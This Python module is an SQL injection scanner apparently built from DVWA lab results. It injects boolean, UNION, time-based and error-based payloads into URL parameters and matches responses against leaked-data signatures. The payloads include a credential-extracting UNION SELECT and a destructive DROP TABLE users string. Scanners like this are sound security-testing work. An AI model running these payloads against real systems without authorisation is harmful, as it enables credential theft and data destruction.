"""
SQL Injection Scanner Module
Based on comprehensive DVWA payload testing results
Success rate: 70% (7/10 payloads successful)
"""

import requests
import time
import re
from typing import Dict, List, Any, Optional, Tuple
import logging
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from dataclasses import dataclass
from enum import Enum

logger = logging.getLogger(__name__)


class SQLInjectionType(Enum):
    BOOLEAN_BASED = "boolean_based"
    UNION_BASED = "union_based"
    TIME_BASED = "time_based"
    ERROR_BASED = "error_based"
    BLIND_BOOLEAN = "blind_boolean"


class Severity(Enum):
    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    CRITICAL = "critical"


@dataclass
class SQLInjectionResult:
    vulnerable: bool
    injection_type: SQLInjectionType
    severity: Severity
    payload: str
    response_time: float
    extracted_data: List[str]
    error_disclosure: List[str]
    confidence: float
    details: Dict[str, Any]


class SQLInjectionScanner:
    """
    SQL Injection Scanner based on DVWA testing results
    Implements validated payloads with 70% success rate
    """
    
    def __init__(self, session: requests.Session, timeout: int = 30):
        self.session = session
        self.timeout = timeout
        
        # Payload database from testing results
        self.payloads = self._initialize_payloads()
        
        # Detection signatures from analysis
        self.detection_signatures = self._initialize_signatures()
        
        # Comment syntax compatibility (hash # works, double dash -- fails)
        self.comment_syntax = "#"  # Based on 100% success rate with hash
        
    def _initialize_payloads(self) -> Dict[SQLInjectionType, List[str]]:
        """
        Initialize payloads based on DVWA testing results
        Exact 70% success rate (7 successful out of 10 total)
        """
        return {
            # Successful payloads (7 total)
            SQLInjectionType.BOOLEAN_BASED: [
                "1' OR '1'='1",           # Payload 1: ✅ BERHASIL
                "1' OR 1=1#",             # Payload 5: ✅ BERHASIL
            ],
            SQLInjectionType.UNION_BASED: [
                "1' UNION SELECT 1,2#",                    # Payload 6: ✅ BERHASIL
                "1' UNION SELECT user(),version()#",       # Payload 7: ✅ BERHASIL (Critical)
            ],
            SQLInjectionType.TIME_BASED: [
                "1' AND SLEEP(5)#",       # Payload 8: ✅ BERHASIL
            ],
            SQLInjectionType.BLIND_BOOLEAN: [
                "1' AND 1=1#",            # Payload 9: ✅ BERHASIL (true)
                "1' AND 1=2#",            # Payload 10: ✅ BERHASIL (false)
            ],
            # Failed payloads (3 total) - for error-based information disclosure
            SQLInjectionType.ERROR_BASED: [
                "1' UNION SELECT user,password FROM users--",  # Payload 2: ❌ Error + Info
                "1'; DROP TABLE users--",                      # Payload 3: ❌ Error + Info
                "1' AND SLEEP(5)--",                          # Payload 4: ❌ Error + Info
            ]
        }
    
    def _initialize_signatures(self) -> Dict[str, List[str]]:
        """
        Initialize detection signatures based on testing results
        """
        return {
            "boolean_success": [
                "Gordon Brown",      # Multiple user extraction
                "Pablo Picasso",     # Specific user names from testing
                "Hack Me",          # Test user data
                "Bob Smith",        # Additional users
                "admin"             # Admin user confirmation
            ],
            "union_success": [
                "root@localhost",    # Database user extraction (Payload 7)
                "10.4.32-MariaDB",  # Version information (Payload 7)
                "mysql",            # Database type
                "localhost",        # Host information
            ],
            "time_based": [
                # Detected by response time analysis
            ],
            "error_disclosure": [
                r"Fatal error:",
                r"mysqli_sql_exception:",
                r"You have an error in your SQL syntax",
                r"MariaDB server version",
                r"C:\\xampp\\htdocs\\[^\\]+",     # Windows path disclosure
                r"line \d+",                      # Line number disclosure
                r"mysqli_[a-z_]+",               # MySQL function disclosure
                r"stack trace"                    # Stack trace information
            ],
            "information_patterns": [
                r"root@localhost",               # Database user
                r"\d+\.\d+\.\d+-MariaDB",       # MariaDB version pattern
                r"[A-Z]:\\[^\\]+\\[^\\]+\.php", # Windows file paths
                r"line \d+",                     # Line numbers
            ]
        }
    
    def detect_comment_syntax(self, url: str, param: str) -> str:
        """
        Test comment syntax compatibility
        Based on findings: hash (#) 100% success, double dash (--) 0% success
        """
        try:
            test_payloads = [
                ("hash", "1' OR 1=1#"),
                ("double_dash", "1' OR 1=1--"),
                ("slash_star", "1' OR 1=1/*")
            ]
            
            for syntax, payload in test_payloads:
                if self._test_payload_success(url, param, payload):
                    logger.info(f"Comment syntax detected: {syntax}")
                    return "#" if syntax == "hash" else "--" if syntax == "double_dash" else "/*"
            
            # Default to hash based on testing results
            return "#"
            
        except Exception as e:
            logger.error(f"Comment syntax detection error: {str(e)}")
            return "#"  # Default to successful syntax
    
    def _test_payload_success(self, url: str, param: str, payload: str) -> bool:
        """
        Test if a payload is successful based on response analysis
        """
        try:
            # Inject payload
            response = self._inject_payload(url, param, payload)
            if not response:
                return False
            
            # Analyze response for success indicators
            return self._analyze_response_success(payload, response.text, response.elapsed.total_seconds())
            
        except Exception as e:
            logger.error(f"Payload test error: {str(e)}")
            return False
    
    def _inject_payload(self, url: str, param: str, payload: str) -> Optional[requests.Response]:
        """
        Inject payload into parameter
        """
        try:
            # Parse URL and parameters
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            # Inject payload
            params[param] = [payload]
            
            # Reconstruct URL
            new_query = urlencode(params, doseq=True)
            injected_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            # Send request
            start_time = time.time()
            response = self.session.get(injected_url, timeout=self.timeout)
            response.elapsed_seconds = time.time() - start_time
            
            return response
            
        except Exception as e:
            logger.error(f"Payload injection error: {str(e)}")
            return None
    
    def _analyze_response_success(self, payload: str, response_text: str, response_time: float) -> bool:
        """
        Analyze response for success indicators based on testing results
        """
        try:
            # Ensure response_text is a string
            if not isinstance(response_text, str):
                return False

            # Boolean-based detection
            boolean_indicators = self.detection_signatures["boolean_success"]
            boolean_count = sum(1 for indicator in boolean_indicators
                               if indicator.lower() in response_text.lower())

            if boolean_count >= 2:  # Multiple indicators = successful injection
                return True

            # Union-based detection
            union_indicators = self.detection_signatures["union_success"]
            if any(indicator in response_text for indicator in union_indicators):
                return True

            # Time-based detection (5 second threshold from testing)
            if response_time >= 4.5:  # Allow some variance
                return True

            return False

        except Exception as e:
            logger.error(f"Response analysis error: {str(e)}")
            return False
    
    def scan_parameter(self, url: str, param: str) -> List[SQLInjectionResult]:
        """
        Scan a specific parameter for SQL injection vulnerabilities
        """
        results = []
        
        try:
            logger.info(f"Scanning parameter '{param}' at {url}")
            
            # Test each injection type
            for injection_type, payloads in self.payloads.items():
                for payload in payloads:
                    result = self._test_injection(url, param, payload, injection_type)
                    if result and result.vulnerable:
                        results.append(result)
                        logger.info(f"Vulnerability found: {injection_type.value} with payload: {payload}")
            
            return results
            
        except Exception as e:
            logger.error(f"Parameter scan error: {str(e)}")
            return results
    
    def _test_injection(self, url: str, param: str, payload: str, 
                       injection_type: SQLInjectionType) -> Optional[SQLInjectionResult]:
        """
        Test specific injection payload
        """
        try:
            # Inject payload and measure response
            start_time = time.time()
            response = self._inject_payload(url, param, payload)
            response_time = time.time() - start_time
            
            if not response:
                return None
            
            # Analyze response
            analysis = self._analyze_response(payload, response.text, response_time, injection_type)
            
            if analysis["vulnerable"]:
                return SQLInjectionResult(
                    vulnerable=True,
                    injection_type=injection_type,
                    severity=analysis["severity"],
                    payload=payload,
                    response_time=response_time,
                    extracted_data=analysis["extracted_data"],
                    error_disclosure=analysis["error_disclosure"],
                    confidence=analysis["confidence"],
                    details=analysis["details"]
                )
            
            return None
            
        except Exception as e:
            logger.error(f"Injection test error: {str(e)}")
            return None

    def _analyze_response(self, payload: str, response_text: str, response_time: float,
                         injection_type: SQLInjectionType) -> Dict[str, Any]:
        """
        Comprehensive response analysis based on testing results
        """
        analysis = {
            "vulnerable": False,
            "severity": Severity.LOW,
            "extracted_data": [],
            "error_disclosure": [],
            "confidence": 0.0,
            "details": {}
        }

        try:
            if injection_type == SQLInjectionType.BOOLEAN_BASED:
                analysis.update(self._analyze_boolean_based(response_text))
            elif injection_type == SQLInjectionType.UNION_BASED:
                analysis.update(self._analyze_union_based(response_text))
            elif injection_type == SQLInjectionType.TIME_BASED:
                analysis.update(self._analyze_time_based(response_time))
            elif injection_type == SQLInjectionType.BLIND_BOOLEAN:
                analysis.update(self._analyze_blind_boolean(payload, response_text))
            elif injection_type == SQLInjectionType.ERROR_BASED:
                analysis.update(self._analyze_error_based(response_text))

            return analysis

        except Exception as e:
            logger.error(f"Response analysis error: {str(e)}")
            return analysis

    def _analyze_boolean_based(self, response_text: str) -> Dict[str, Any]:
        """
        Analyze boolean-based injection based on DVWA testing results
        Success indicators: Gordon Brown, Pablo Picasso, Hack Me, Bob Smith, admin
        """
        try:
            if not isinstance(response_text, str):
                return {"vulnerable": False}

            indicators = self.detection_signatures["boolean_success"]
            found_indicators = [ind for ind in indicators if ind.lower() in response_text.lower()]

            # More specific user detection
            user_names = ["Gordon", "Pablo", "Hack", "Bob"]
            found_users = [user for user in user_names if user.lower() in response_text.lower()]

            # Require multiple different users for positive detection
            if len(found_users) >= 2:  # Multiple users = successful bypass
                return {
                    "vulnerable": True,
                    "severity": Severity.HIGH,
                    "extracted_data": found_users + ["admin"] if "admin" in response_text.lower() else found_users,
                    "confidence": min(len(found_users) * 0.4, 1.0),
                    "details": {
                        "users_extracted": found_users,
                        "bypass_successful": True
                    }
                }

            return {"vulnerable": False}

        except Exception as e:
            logger.error(f"Boolean analysis error: {str(e)}")
            return {"vulnerable": False}

    def _analyze_union_based(self, response_text: str) -> Dict[str, Any]:
        """
        Analyze union-based injection
        Critical indicators: root@localhost, 10.4.32-MariaDB (from Payload 7)
        """
        indicators = self.detection_signatures["union_success"]
        found_indicators = [ind for ind in indicators if ind in response_text]

        # Check for critical system information
        critical_info = []
        if "root@localhost" in response_text:
            critical_info.append("Database User: root@localhost")
        if "MariaDB" in response_text:
            version_match = re.search(r'(\d+\.\d+\.\d+-MariaDB)', response_text)
            if version_match:
                critical_info.append(f"Database Version: {version_match.group(1)}")

        if found_indicators:
            severity = Severity.CRITICAL if critical_info else Severity.HIGH
            return {
                "vulnerable": True,
                "severity": severity,
                "extracted_data": found_indicators + critical_info,
                "confidence": 0.9 if critical_info else 0.7,
                "details": {
                    "system_info": critical_info,
                    "union_successful": True,
                    "data_extraction": True
                }
            }

        return {"vulnerable": False}

    def _analyze_time_based(self, response_time: float) -> Dict[str, Any]:
        """
        Analyze time-based injection
        Based on SLEEP(5) testing - 5 second delay indicates success
        """
        try:
            # More strict time-based detection - must be within expected range
            if 4.5 <= response_time <= 5.5:  # Expected SLEEP(5) range
                accuracy = 1.0 - abs(5.0 - response_time) / 5.0
                confidence = max(accuracy, 0.6)  # Minimum confidence for time-based
                return {
                    "vulnerable": True,
                    "severity": Severity.MEDIUM,
                    "extracted_data": [f"Response delay: {response_time:.2f}s"],
                    "confidence": confidence,
                    "details": {
                        "response_time": response_time,
                        "expected_delay": 5.0,
                        "time_based_confirmed": True,
                        "accuracy": accuracy
                    }
                }

            return {"vulnerable": False}

        except Exception as e:
            logger.error(f"Time-based analysis error: {str(e)}")
            return {"vulnerable": False}

    def _analyze_blind_boolean(self, payload: str, response_text: str) -> Dict[str, Any]:
        """
        Analyze blind boolean injection
        Based on 1=1 (true) vs 1=2 (false) testing results
        """
        # Determine if this is a true or false condition
        is_true_condition = "1=1" in payload or "'a'='a'" in payload
        has_data = bool(response_text.strip() and "admin" in response_text.lower())

        # True condition should return data, false condition should not
        expected_result = is_true_condition
        actual_result = has_data

        if expected_result == actual_result:
            return {
                "vulnerable": True,
                "severity": Severity.MEDIUM,
                "extracted_data": [f"Blind boolean condition: {payload}"],
                "confidence": 0.8,
                "details": {
                    "condition_type": "true" if is_true_condition else "false",
                    "expected_data": expected_result,
                    "received_data": actual_result,
                    "blind_injection_confirmed": True
                }
            }

        return {"vulnerable": False}

    def _analyze_error_based(self, response_text: str) -> Dict[str, Any]:
        """
        Analyze error-based information disclosure
        Based on failed payload error messages
        """
        error_patterns = self.detection_signatures["error_disclosure"]
        info_patterns = self.detection_signatures["information_patterns"]

        found_errors = []
        found_info = []

        for pattern in error_patterns:
            matches = re.findall(pattern, response_text, re.IGNORECASE)
            found_errors.extend(matches)

        for pattern in info_patterns:
            matches = re.findall(pattern, response_text)
            found_info.extend(matches)

        if found_errors or found_info:
            return {
                "vulnerable": True,
                "severity": Severity.MEDIUM,
                "extracted_data": found_info,
                "error_disclosure": found_errors,
                "confidence": 0.6,
                "details": {
                    "error_based": True,
                    "information_disclosure": True,
                    "disclosed_paths": [info for info in found_info if "\\" in info],
                    "disclosed_functions": [info for info in found_info if "mysqli_" in info]
                }
            }

        return {"vulnerable": False}

    def scan_url(self, url: str, parameters: List[str] = None) -> Dict[str, List[SQLInjectionResult]]:
        """
        Scan URL for SQL injection vulnerabilities
        """
        results = {}

        try:
            # Auto-detect parameters if not provided
            if not parameters:
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query)
                parameters = list(params.keys())

            if not parameters:
                logger.warning(f"No parameters found to test in URL: {url}")
                return results

            # Test each parameter
            for param in parameters:
                logger.info(f"Testing parameter: {param}")
                param_results = self.scan_parameter(url, param)
                if param_results:
                    results[param] = param_results

            return results

        except Exception as e:
            logger.error(f"URL scan error: {str(e)}")
            return results

    def generate_report(self, results: Dict[str, List[SQLInjectionResult]]) -> Dict[str, Any]:
        """
        Generate comprehensive scan report
        """
        report = {
            "summary": {
                "total_parameters": len(results),
                "vulnerable_parameters": len([p for p in results if results[p]]),
                "total_vulnerabilities": sum(len(vulns) for vulns in results.values()),
                "severity_breakdown": {"low": 0, "medium": 0, "high": 0, "critical": 0}
            },
            "vulnerabilities": [],
            "recommendations": []
        }

        # Process results
        for param, vulns in results.items():
            for vuln in vulns:
                vuln_data = {
                    "parameter": param,
                    "type": vuln.injection_type.value,
                    "severity": vuln.severity.value,
                    "payload": vuln.payload,
                    "confidence": vuln.confidence,
                    "extracted_data": vuln.extracted_data,
                    "error_disclosure": vuln.error_disclosure,
                    "details": vuln.details
                }
                report["vulnerabilities"].append(vuln_data)
                report["summary"]["severity_breakdown"][vuln.severity.value] += 1

        # Add recommendations
        if report["vulnerabilities"]:
            report["recommendations"] = [
                "Implement parameterized queries/prepared statements",
                "Use input validation and sanitization",
                "Apply principle of least privilege for database accounts",
                "Enable SQL injection detection in WAF",
                "Regular security testing and code review"
            ]

        return report
